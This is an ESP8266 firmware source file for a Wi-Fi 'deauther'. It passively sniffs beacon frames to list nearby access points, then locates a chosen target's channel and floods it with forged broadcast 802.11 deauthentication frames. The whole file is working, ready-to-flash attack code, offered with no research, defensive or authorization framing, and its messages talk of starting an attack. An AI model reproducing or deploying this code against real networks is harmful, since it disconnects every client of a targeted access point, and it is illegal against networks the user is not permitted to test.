// ESP8266 Focused Deauther with Auto Channel Detection & Passive Scan Fallback
// Description:
// - Accepts a target MAC address (manual)
// - If no MAC is provided, performs a passive scan and lists nearby APs
// - If MAC is valid, scans all Wi-Fi channels to locate the AP and its channel
// - Locks on that channel and sends repeated deauth packets
// Version 2.1 - Comprehensive Fix

#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

// --- Configuration ---

const char* targetMACStr = ""; // Leave blank for passive scan mode (e.g., "DE:AD:BE:EF:11:22")
#define DEAUTH_INTERVAL 100   // Milliseconds between deauth packets
#define BURST_COUNT 10        // Number of deauth packets per burst
#define SCAN_DURATION 10000   // Milliseconds for the total passive scan duration
#define DETECT_TIMEOUT 5000   // Milliseconds to search for the target AP's channel

// --- Global Variables ---
uint8_t targetMAC[6];
bool macSet = false;
uint8_t detectedChannel = 1;
bool channelFound = false;
bool scanning = false;

// --- 802.11 Packet Structures ---

// Structure for the RxControl metadata header provided by the ESP8266 SDK
struct RxControl {
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned mcs: 7;
  unsigned cwb: 1;
  unsigned ht_length: 16;
  unsigned smoothing: 1;
  unsigned not_sounding: 1;
  unsigned: 1;
  unsigned aggregation: 1;
  unsigned stbc: 2;
  unsigned fec_coding: 1;
  unsigned sgi: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};

// Structure for the 802.11 MAC header
struct MacHeader {
  uint8_t frameControl[2];
  uint8_t duration[2];
  uint8_t addr1[6]; // Receiver
  uint8_t addr2[6]; // Transmitter
  uint8_t addr3[6]; // BSSID
  uint8_t sequenceControl[2];
};

// Structure for the fixed parameters in a beacon frame's management data
struct BeaconFixedParams {
  uint8_t timestamp[8];
  uint16_t beacon_interval;
  uint16_t capability_info;
};

// Structure for a tagged parameter (e.g., SSID)
struct TaggedParam {
  uint8_t tag_number;
  uint8_t tag_length;
  // Followed by tag_length bytes of data
};

// The complete sniffer packet structure for a beacon frame
struct BeaconPacket {
  struct RxControl rx_ctrl;
  struct MacHeader mac_header;
  struct BeaconFixedParams fixed_params;
  // Followed by tagged parameters
};

// Deauthentication packet template
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP BSSID
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP BSSID
  0x00, 0x00, // Sequence Ctl
  0x01, 0x00  // Reason Code: Unspecified
};

// --- AP Discovery & Tracking ---
#define MAX_APS 50
uint8_t foundAPs[MAX_APS][6];
int apCount = 0;

bool apAlreadyFound(const uint8_t* mac) {
  for (int i = 0; i < apCount; i++) {
    if (memcmp(foundAPs[i], mac, 6) == 0) {
      return true;
    }
  }
  return false;
}

// --- Sniffer Callbacks ---

// Callback for passive scanning to find all APs
void snifferCallbackScan(uint8_t* buf, uint16_t len) {
  if (!scanning || len < sizeof(BeaconPacket)) return;

  const struct BeaconPacket* packet = (struct BeaconPacket*)buf;
  
  // Check if it's a beacon frame (type 0, subtype 8)
  if (packet->mac_header.frameControl[0] != 0x80) return;
  
  const uint8_t* bssid = packet->mac_header.addr3;

  if (apCount < MAX_APS && !apAlreadyFound(bssid)) {
    memcpy(foundAPs[apCount], bssid, 6);
    apCount++;

    // --- SSID Parsing Logic ---
    char ssid[33] = {0}; // Max SSID length is 32, plus null terminator
    int ssid_len = 0;
    
    // Point to the start of tagged parameters
    const uint8_t* tagged_params_ptr = (const uint8_t*)&packet->fixed_params + sizeof(BeaconFixedParams);
    const uint8_t* packet_end = buf + len;

    while (tagged_params_ptr < packet_end) {
      const TaggedParam* tag = (const TaggedParam*)tagged_params_ptr;
      
      // Check for SSID tag (Tag Number 0)
      if (tag->tag_number == 0 && tag->tag_length > 0 && tag->tag_length <= 32) {
        ssid_len = tag->tag_length;
        memcpy(ssid, (char*)tag + sizeof(TaggedParam), ssid_len);
        ssid[ssid_len] = '\0'; // Null-terminate the SSID
        break; // Found SSID, exit loop
      }
      
      // Move to the next tag
      tagged_params_ptr += sizeof(TaggedParam) + tag->tag_length;
      if (tag->tag_length == 0) break; // Avoid infinite loop on malformed packet
    }
    // --- End SSID Parsing ---
    
    Serial.printf("[SCAN] SSID: %-20s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %2d\n",
                  ssid_len > 0 ? ssid : "[Hidden]",
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                  packet->rx_ctrl.channel);
  }
}

// Callback for finding the channel of a specific target AP
void snifferCallbackDetectChannel(uint8_t* buf, uint16_t len) {
  if (channelFound || len < sizeof(BeaconPacket)) return;

  const struct BeaconPacket* packet = (struct BeaconPacket*)buf;

  // Check for Beacon or Probe Response frames from our target
  if (packet->mac_header.frameControl[0] != 0x80 && packet->mac_header.frameControl[0] != 0x50) return;

  const uint8_t* bssid = packet->mac_header.addr3;
  
  if (memcmp(bssid, targetMAC, 6) == 0) {
    detectedChannel = packet->rx_ctrl.channel;
    channelFound = true;
    Serial.printf("[INFO] Target AP found on channel %d\n", detectedChannel);
  }
}

// --- Core Functions ---

bool parseMAC(const char* macStr, uint8_t* mac) {
  if (strlen(macStr) != 17) return false;
  return sscanf(macStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

void passiveScan() {
  Serial.println("[SCAN] Starting passive scan. Nearby APs:");
  scanning = true;
  apCount = 0;
  memset(foundAPs, 0, sizeof(foundAPs));

  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(snifferCallbackScan);

  unsigned long startTime = millis();
  uint8_t currentChannel = 1;
  while (millis() - startTime < SCAN_DURATION) {
    wifi_set_channel(currentChannel);
    delay(50); // Short delay on each channel
    currentChannel = (currentChannel % 13) + 1;
  }

  wifi_promiscuous_enable(0);
  scanning = false;
  Serial.println("[SCAN] Done. Set targetMACStr and restart to begin an attack.");
}

void detectChannel() {
  channelFound = false;
  wifi_set_opmode(STATION_MODE);
  wifi_set_promiscuous_rx_cb(snifferCallbackDetectChannel);
  wifi_promiscuous_enable(1);

  Serial.println("[INFO] Scanning for target AP channel...");
  unsigned long detectStartTime = millis();
  uint8_t currentChannel = 1;

  while (!channelFound && (millis() - detectStartTime < DETECT_TIMEOUT)) {
    wifi_set_channel(currentChannel);
    delay(50);
    currentChannel = (currentChannel % 13) + 1;
  }

  wifi_promiscuous_enable(0);

  if (!channelFound) {
    Serial.println("[WARN] Channel detection failed. Defaulting to CH1.");
    detectedChannel = 1;
  }
}

void setDeauthMACs(uint8_t* mac) {
  memcpy(&deauthPacket[10], mac, 6); // Source
  memcpy(&deauthPacket[16], mac, 6); // BSSID
}

// --- Main Setup & Loop ---
void setup() {  
  Serial.begin(115200);  delay(100);  Serial.println("\n\n--- ESP8266 Deauther ---");  Serial.println("[BOOT] System starting... Please wait 3 seconds.");  delay(3000);

  if (strlen(targetMACStr) == 17 && parseMAC(targetMACStr, targetMAC)) {
    macSet = true;
    Serial.printf("[INFO] Target MAC set to: %s\n", targetMACStr);
    detectChannel();
    wifi_set_channel(detectedChannel);
    setDeauthMACs(targetMAC);
    Serial.println("[READY] Beginning deauth attack loop.");
  } else {
    Serial.println("[INFO] No valid MAC provided. Entering passive scan mode.");
    delay(2000);
    passiveScan();
    // Halt execution after scanning
    Serial.println("[HALT] Restart device to scan again or attack.");
    // Halt execution after scanning and enter standby blink mode
    Serial.println("[HALT] Scan complete. Entering standby mode (blinking LED).");
    pinMode(LED_BUILTIN, OUTPUT);
    while(true) {
      digitalWrite(LED_BUILTIN, LOW); // LED ON
      delay(500);
      digitalWrite(LED_BUILTIN, HIGH); // LED OFF
      delay(500);
    }
  }
}

void loop() {
  if (!macSet) return;

  for (int i = 0; i < BURST_COUNT; i++) {
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    delay(2); // Small delay between packets in a burst
  }
  
  Serial.printf("[DEAUTH] Sent burst to %02X:%02X:%02X:%02X:%02X:%02X on CH%d\n",
                targetMAC[0], targetMAC[1], targetMAC[2],
                targetMAC[3], targetMAC[4], targetMAC[5],
                detectedChannel);
                
  delay(DEAUTH_INTERVAL);
}